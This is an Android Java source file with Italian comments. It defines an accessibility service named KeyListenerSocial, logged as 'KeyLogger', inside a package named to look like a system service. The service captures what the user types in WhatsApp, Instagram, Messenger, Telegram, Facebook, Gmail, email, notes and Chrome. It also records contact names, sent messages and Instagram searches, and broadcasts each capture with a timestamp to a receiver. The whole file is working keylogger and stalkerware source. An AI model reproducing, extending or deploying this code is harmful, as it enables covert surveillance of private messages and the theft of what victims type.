package com.example.systemservice;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Intent;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.LinkedList;

public class KeyListenerSocial extends AccessibilityService {
    //Costanti
    private static String TAG = "KeyLogger";
    private static int SHIFT_ULT_MESS_WHATSAPP = 2;
    private static int SHIFT_ULT_MESS_INSTAGRAM = 2;

    //Liste/Var temp
    private ArrayList<AccessibilityNodeInfo> textViewNodes = new ArrayList<AccessibilityNodeInfo>();
    private LinkedList<KeyHelperContact> messaggiDaVerificare = new LinkedList<KeyHelperContact>();

    private static String packTemp = "";
    private static int shiftUltMess = 0;

    public void RegistraContatto(String nomeContatto, String mess, String orario) {
        int posContatto = CercaContatto(nomeContatto);
        if (CercaContatto(nomeContatto) == -1) {
            //Contatto non presente
            messaggiDaVerificare.add(new KeyHelperContact(nomeContatto, mess, orario));
        } else {
            //Contatto già presente
            messaggiDaVerificare.set(posContatto, new KeyHelperContact(nomeContatto, mess, orario));
        }
    }

    public int CercaContatto(String nomeC) {
        int out = 0;
        for (KeyHelperContact c : messaggiDaVerificare) {
            if (c.nomeContatto.equals(nomeC))
                return out;
            out++;
        }

        return -1;
    }

    private static int setShiftUltMess(String pack) {
        switch (pack) {
            case ApplicationPackageNames.WHATSAPP_PACK_NAME:
                return SHIFT_ULT_MESS_WHATSAPP;
            case ApplicationPackageNames.INSTAGRAM_PACK_NAME:
                return SHIFT_ULT_MESS_INSTAGRAM;
            default:
                return 0;
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        String pack = event.getPackageName().toString();
        packTemp = pack;
        shiftUltMess = setShiftUltMess(pack);
        String nomeContatto;
        final int eventType = event.getEventType();
        switch (eventType) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                String eventText = "";
                if ((!event.getText().contains("null")) && (!event.getText().toString().equals("[Scrivi un messaggio]"))) {
                    eventText = event.getText().toString();
                    eventText = parsaTestoLog(eventText);
                }
                //Prendo l'orario
                DateFormat df = new SimpleDateFormat("ddMMyyyyHHmmss");
                String orario = df.format(Calendar.getInstance().getTime());
                //Caso Messanger, Facebook, Mail, Note
                if (pack.equals(ApplicationPackageNames.FACEBOOK_PACK_NAME) || pack.equals(ApplicationPackageNames.FACEBOOK_MESSENGER_PACK_NAME) || pack.equals(ApplicationPackageNames.NOTEPAD_PACK_NAME) || pack.equals(ApplicationPackageNames.GMAIL_PACK_NAME) || pack.equals(ApplicationPackageNames.EMAIL_PACK_NAME) || pack.equals(ApplicationPackageNames.CHROME_PACK_NAME)) {
                    //Prendo solo il testo digitato e lo invio
                    if (!eventText.equals("Scrivi email") && !eventText.equals("A cosa stai pensando?"))
                        InviaInBroadcast(new Notifica("", pack, "LOG_KEYLOG", eventText, orario));
                    break;
                }
                boolean cercoInstagram = searchInstagram();
                if (pack == ApplicationPackageNames.WHATSAPP_PACK_NAME || !cercoInstagram) {
                    nomeContatto = GetContactName();
                    //Prendo ultimo messaggio nella chat
                    String ultimoMessaggio = GetLastMessage();
                    if (ultimoMessaggio != null && nomeContatto != null) {
                        if (!ultimoMessaggio.equals("")) {
                            if (ultimoMessaggio.equals(eventText)) {
                                //Invio
                                InviaInBroadcast(new Notifica("", pack, nomeContatto, eventText, orario));
                            } else {
                                RegistraContatto(nomeContatto, eventText, orario);
                            }
                        }
                    }
                } else {
                    if (cercoInstagram) {
                        //Caso "Ho cercato qualcuno"(Instagram)
                        InviaInBroadcast(new Notifica("", pack, "LOG_KEYLOG_INSTAGRAM_SEARCH", eventText, orario));
                    }
                }
                break;
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                if (pack.equals(ApplicationPackageNames.WHATSAPP_PACK_NAME) || (pack.equals(ApplicationPackageNames.INSTAGRAM_PACK_NAME) && !searchInstagram())) {
                    int posContatto = 0;
                    try {
                        nomeContatto = GetContactName();
                        posContatto = CercaContatto(nomeContatto);
                    } catch (Exception ex) {
                        posContatto = -1;
                    }
                    if (posContatto != -1) {
                        //Se il contatto esiste
                        KeyHelperContact esame = messaggiDaVerificare.get(posContatto);
                        if (esame.devoVerificare) {
                            //Se devo verificare il messaggio
                            String ultimoMess = GetLastMessage();
                            if (ultimoMess.equals(esame.testoDaVerificare)) {
                                //L'utente ha scritto quel messaggio quindi lo invio in broadcast
                                InviaInBroadcast(new Notifica("", pack, esame.nomeContatto, esame.testoDaVerificare, esame.orario));
                            }
                            messaggiDaVerificare.remove(posContatto);
                        }
                    }
                }
                break;
        }
    }

    private String parsaTestoLog(String in) {
        try {
            String out = in.substring(1, in.length() - 1);
            //Se il carattere finale è uno spazio lo elimino
            if (out.charAt(out.length() - 1) == ' ')
                out = out.substring(0, out.length() - 1);
            return out;
        } catch (Exception ex) {
            return in;
        }
    }

    private void findChildViews(AccessibilityNodeInfo parentView) {
        if (parentView == null || parentView.getClassName() == null) {
            return;
        }
        int childCount = parentView.getChildCount();
        if (childCount == 0 && (parentView.getClassName().toString().contentEquals("android.widget.TextView"))) {
            textViewNodes.add(parentView);
        } else {
            for (int i = 0; i < childCount; i++) {
                findChildViews(parentView.getChild(i));
            }
        }
    }

    private String GetContactName() {
        textViewNodes.clear();
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            findChildViews(rootNode);
            AccessibilityNodeInfo mNode = textViewNodes.get(0);
            if (mNode.getText() != null)
                return mNode.getText().toString();
            else
                return null;
        } catch (Exception ex) {
            return null;
        }
    }

    private String GetLastMessage() {
        String ultimoMessaggio = "";
        try {
            ultimoMessaggio = textViewNodes.get(textViewNodes.size() - shiftUltMess).getText().toString();
            if (packTemp.equals(ApplicationPackageNames.INSTAGRAM_PACK_NAME)) {
                if (ultimoMessaggio == "Invio in corso...") {
                    ultimoMessaggio = textViewNodes.get(textViewNodes.size() - 1).getText().toString();
                    return ultimoMessaggio;
                }
                if ((ultimoMessaggio.contains("AM") || ultimoMessaggio.contains("PM")) && ultimoMessaggio.contains(":"))
                    ultimoMessaggio = textViewNodes.get(textViewNodes.size() - 1).getText().toString();
            }
            return ultimoMessaggio;
        } catch (Exception ex) { //Non ci sono messaggi
            ultimoMessaggio = "";
        }
        return ultimoMessaggio;
    }

    private boolean searchInstagram() {
        textViewNodes.clear();
        try {
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            findChildViews(rootNode);
            AccessibilityNodeInfo mNodeUno = textViewNodes.get(textViewNodes.size() - 1);
            AccessibilityNodeInfo mNodeDue = textViewNodes.get(textViewNodes.size() - 2);
            AccessibilityNodeInfo mNodeTre = textViewNodes.get(textViewNodes.size() - 3);
            AccessibilityNodeInfo mNodeQuattro = textViewNodes.get(textViewNodes.size() - 4);
            if ((mNodeUno.getText().equals("LUOGHI") && mNodeDue.getText().equals("HASHTAG") && mNodeTre.getText().equals("ACCOUNT") && mNodeQuattro.getText().equals("TUTTO")) || (mNodeUno.getText().equals("PLACES") && mNodeDue.getText().equals("TAGS") && mNodeTre.getText().equals("ACCOUNTS") && mNodeQuattro.getText().equals("TOP")))
                return true;
            else
                return false;
        } catch (Exception ex) {
            return false;
        }
    }

    public void InviaInBroadcast(Notifica send) {
        Intent intent = new Intent("logSocialReceiver");
        intent.putExtra("ID", send.getID());
        intent.putExtra("Applicazione", send.getApplicazione());
        intent.putExtra("Titolo", send.getTitolo());
        intent.putExtra("Testo", send.getTesto());
        intent.putExtra("DateTime", send.getDateTime());
        sendBroadcast(intent);
    }

    @Override
    public void onInterrupt() {
        //whatever
    }

    @Override
    public void onServiceConnected() {
        Log.d(TAG, "***** Access onServiceConnected");
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.notificationTimeout = 1000;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        //Setto i package da controllare
        info.packageNames = new String[]{ApplicationPackageNames.WHATSAPP_PACK_NAME, ApplicationPackageNames.INSTAGRAM_PACK_NAME, ApplicationPackageNames.FACEBOOK_MESSENGER_PACK_NAME, ApplicationPackageNames.TELEGRAM_PACK_NAME, ApplicationPackageNames.TELEGRAM_X_PACK_NAME, ApplicationPackageNames.FACEBOOK_PACK_NAME, ApplicationPackageNames.EMAIL_PACK_NAME, ApplicationPackageNames.GMAIL_PACK_NAME, ApplicationPackageNames.NOTEPAD_PACK_NAME, ApplicationPackageNames.CHROME_PACK_NAME};
        setServiceInfo(info);
    }
}

